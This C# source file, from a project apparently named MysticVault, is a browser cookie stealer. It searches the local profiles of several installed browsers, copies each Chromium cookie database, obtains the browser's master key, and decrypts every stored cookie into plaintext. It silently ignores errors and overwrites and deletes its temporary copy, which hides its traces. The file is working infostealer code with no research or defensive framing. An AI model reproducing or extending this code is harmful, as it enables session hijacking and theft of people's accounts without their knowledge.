using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Data.Sqlite;

namespace MysticVault;

public record ExtractedCookie(string HostKey, string Name, string Value, string Path, bool IsSecure, bool IsHttpOnly);

public static class CookieExtractor
{
    public static List<ExtractedCookie> ExtractAll()
    {
        var cookies = new List<ExtractedCookie>();
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        foreach (var browser in BrowserData.Browsers)
        {
            string userDataPath = Path.Combine(localAppData, browser.UserDataPath);
            if (!Directory.Exists(userDataPath)) continue;
            try
            {
                cookies.AddRange(ExtractFromBrowser(userDataPath, browser.LocalStatePath, browser.ExePath));
            }
            catch { }
        }

        return cookies;
    }

    public static List<ExtractedCookie> ExtractFromBrowser(string userDataPath, string localStatePath, string exePath)
    {
        var results = new List<ExtractedCookie>();
        string fullLsp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), localStatePath);
        string cookiesPath = Path.Combine(userDataPath, @"Default\Network\Cookies");
        if (!File.Exists(cookiesPath))
            cookiesPath = Path.Combine(userDataPath, @"Default\Cookies");
        if (!File.Exists(cookiesPath))
            return results;

        byte[]? masterKey = BrowserExtractor.GetMasterKey(fullLsp, exePath);
        if (masterKey == null) return results;

        string tempDbPath = Path.GetTempFileName();
        try
        {
            File.Copy(cookiesPath, tempDbPath, true);
            using var connection = new SqliteConnection($"Data Source={tempDbPath}");
            connection.Open();
            var command = connection.CreateCommand();
            command.CommandText = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0";
            using var reader = command.ExecuteReader();
            while (reader.Read())
            {
                string hostKey = reader.GetString(0);
                string name = reader.GetString(1);
                byte[] encryptedValue = (byte[])reader.GetValue(2);
                string path = reader.GetString(3);
                bool isSecure = reader.GetInt32(4) != 0;
                bool isHttpOnly = reader.GetInt32(5) != 0;

                if (encryptedValue != null && encryptedValue.Length > 0)
                {
                    string value = BrowserExtractor.DecryptPassword(encryptedValue, masterKey);
                    if (!string.IsNullOrEmpty(value))
                        results.Add(new ExtractedCookie(hostKey, name, value, path, isSecure, isHttpOnly));
                }
            }
        }
        catch { }
        finally
        {
            if (File.Exists(tempDbPath))
            {
                try
                {
                    var fi = new FileInfo(tempDbPath);
                    if (fi.Exists)
                    {
                        byte[] buffer = new byte[fi.Length];
                        using (var fs = new FileStream(tempDbPath, FileMode.Open, FileAccess.Write, FileShare.None))
                            fs.Write(buffer, 0, buffer.Length);
                    }
                    File.Delete(tempDbPath);
                }
                catch { }
            }
        }

        return results;
    }
}
